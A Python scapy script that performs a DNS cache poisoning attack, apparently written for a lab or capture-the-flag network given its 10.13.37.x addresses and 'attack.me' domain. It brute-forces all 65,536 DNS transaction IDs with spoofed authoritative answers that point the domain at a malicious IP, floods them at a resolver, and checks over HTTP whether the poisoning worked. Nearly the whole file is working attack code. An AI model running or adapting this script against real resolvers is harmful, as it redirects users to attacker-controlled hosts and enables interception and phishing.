from scapy.all import *
import time

import os
import requests
import random

SPOOF_NAMESERVER = "10.13.37.5"
RESOLVER_IP = "10.13.37.3"
MALICOUS_ANSWER_IP = "10.13.37.6"
VICTIM_DOMAIN_NAME = "attack.me"
POISONED_RECORD_TTL = 180
POISONED_VERIFICATION_TEXT = "RESOLVER CACHE HAS BEEN POISONED"

IP_LAYER = IP(src=SPOOF_NAMESERVER, dst=RESOLVER_IP)
UDP_LAYER = UDP(dport=1337)

packets_to_send = []

print("[+] Preparing All Possible Combinations")
# 65536
for txid in range(0, 65536):
    dns_layer = DNS(
        id=txid,
        qd=DNSQR(qname=VICTIM_DOMAIN_NAME),
        aa=1,
        qr=1,
        an=DNSRR(
            rrname=VICTIM_DOMAIN_NAME,
            type='A',
            ttl=POISONED_RECORD_TTL,
            rdata=MALICOUS_ANSWER_IP)
    )
    packets_to_send.append(bytes(Ether()/IP(src=SPOOF_NAMESERVER, dst=RESOLVER_IP)/UDP(dport=1337)/dns_layer))

random.shuffle(packets_to_send)
print("[+] Finished Preparing Spoofed Packets")

print("[+] Creating Valid DNS Question")
ping = Ether()/IP(src="10.13.37.6", dst="10.13.37.3")/UDP(sport=9999, dport=53)/DNS(rd=1, qd=DNSQR(qname="attack.me"))
packets_to_send.insert(0, ping)


# https://blog.woefe.com/posts/faster_scapy.html
s = conf.L2socket(iface="eth0")
start = time.time()
print("[+] Getting Ready to Send Spoofed Packets...")
for f in packets_to_send:
    s.send(f)
end = time.time()
print(f"[+] All packets sent! {end-start}")

print("==Verification==")
r = requests.get("http://attack.me", verify=False)

if POISONED_VERIFICATION_TEXT in r.text:
    print("[+] Success!")
else:
    print("ATTACK HAS FAILED")